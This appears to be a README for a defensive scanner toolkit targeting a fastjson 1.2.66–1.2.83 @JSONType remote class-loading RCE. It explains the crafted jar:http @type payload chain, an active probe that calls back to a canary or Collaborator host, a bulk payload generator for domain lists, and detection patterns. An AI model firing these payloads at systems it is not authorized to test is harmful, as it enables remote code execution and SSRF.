# fastjson `@JSONType` remote-class-load RCE — environment scanner

Detects exposure to the fastjson 1.2.66–1.2.83 `@JSONType` resource-probe RCE
(`checkAutoType` fetches `typeName.replace('.','/')+".class"`; a crafted `@type`
`jar:http:..<int-ip>:<port>.<tok>!.POC` becomes a remote `jar:` URL that a Spring
Boot `LaunchedURLClassLoader` fetches → `defineClass` → `<clinit>` = RCE). Fires
with **autoType off** and through `parseObject(body, Dto.class)` ("binding is not a
mitigation"). Lab-reproduced; see `../TYPED_BIND_FINDINGS.md`.

**Exposure = ALL of:** fastjson **1.2.66–1.2.83** on classpath · a classloader that
resolves `jar:http://` resource names (**Spring Boot fat-jar** `LaunchedURLClassLoader`)
· untrusted JSON reaching a parse · HTTP egress. **JDK 8 → RCE; JDK 9+ → SSRF only**
(crafted internal name rejected at `defineClass`).

## Tools (Python 3 stdlib only — no install)

### 1. `fjscan_static.py` — inventory (no traffic to apps)
Walks jars/wars/ears (or dirs) and flags the vulnerable *combination*.
```
python3 fjscan_static.py /path/to/artifacts /path/to/app.jar
python3 fjscan_static.py --json /srv/deployments > exposure.json   # CI gate: exit 2 if EXPOSED
```
Verdicts: `EXPOSED` (fastjson 1.2.66–83 + SB fat-jar loader) · `REVIEW` (1.2.x out of
tested range, or unknown/shaded) · `FASTJSON_NO_SB` (fastjson at risk, no fat-jar loader
here — still check the app's actual classloader) · `FASTJSON2_OR_SAFE` · `NO_FASTJSON`.
Recurses `BOOT-INF/lib`, `WEB-INF/lib`, `lib`. Reads `Build-Jdk` as a hint — **confirm
the runtime JDK on the host** (`java -version`; 8 = RCE).

### 2. `fjscan_probe.py` — active, SAFE reachability proof
Sends the crafted `@type` at a canary you control; a callback = the vulnerable path is
reachable. **Serves nothing (404) → SSRF only, never RCE.** Authorized targets only.
```
# self-contained canary (run on a host targets can reach):
python3 fjscan_probe.py --canary-ip <this-host-ip> --listen-port 19000 --targets targets.txt

# external Burp Collaborator / interactsh:
python3 fjscan_probe.py --collaborator <ip|int|host|collab-sub> --port 80 --targets targets.txt
```
`targets.txt`: one target per line (`-` = stdin). Each line is a full `[METHOD ]URL` **or a
bare domain** — bare domains are expanded with `--scheme` / `--target-port` / `--path`
(default `http` + `/parse`), so you can feed a plain domain list:
```
# domains.txt
api.internal.example
POST https://svc.example/v1/ingest
10.0.0.7:8080
```
```
python3 fjscan_probe.py --collaborator <collab> --targets domains.txt --path /api/parse
cat domains.txt | python3 fjscan_probe.py --collaborator <collab> --targets -
```
Nest the probe in a field with `--wrap '{"name":{{P}}}'`. Each target gets a unique token, so
callbacks map back to the exact domain. Exit 2 if any target calls back.

**Bulk payloads for manual Burp testing** — `fjpayload.py --targets-file` emits one payload per
domain with a stable per-target token (`fj<sha1>`):
```
python3 fjpayload.py <collab> --targets-file domains.txt         # or -f -   for stdin
```

### 3. `fjpayload.py` — one-shot payload generator (manual Burp Repeater)
```
python3 fjpayload.py <collaborator> [--port N] [--token T] [--wrap '{"u":{{P}}}']
```

## The Collaborator / dotted-host constraint (important)
The sink does `typeName.replace('.','/')`, so **every dot in the host becomes a slash** —
a dotted hostname (`abc.oastify.com`) turns into `abc/oastify/com` and never resolves.
The tools therefore encode the callback host as a **decimal integer** (`127.0.0.1`→
`2130706433`). A dotted Burp Collaborator subdomain is auto-resolved to its IPv4 and
encoded the same way; **DNS-subdomain correlation will NOT fire** — correlate instead on
the unique **URL path token** the tools embed (Burp shows it in the HTTP interaction), or
use a private Collaborator / interactsh reachable by IP.

## Recommended fleet workflow
1. `fjscan_static.py` across build artifacts / container images / registries → `EXPOSED` list.
2. For each `EXPOSED` host, confirm runtime `java -version` (8 = RCE, 9+ = SSRF).
3. `fjscan_probe.py` against the live endpoints to prove reachability (SSRF callback).
4. Detection/mitigation: alert on `@type` containing `jar:`,`!`,`..`, or integer-IP literals;
   `-Dfastjson.parser.safeMode=true`; restrict egress; move to JDK 9+; migrate off fastjson 1.x.

## Validation
Proven on the lab against a true-positive (Spring Boot `LaunchedURLClassLoader` +
`parseObject(body,Dto.class)`) and true-negative (plain AppClassLoader): static → EXPOSED
vs FASTJSON_NO_SB; probe → VULNERABLE vs no-callback. Test servers: `VulnServer.java` /
`SafeServer.java` (lab `/tmp/`), harness `a JDK 8 test host`.
```
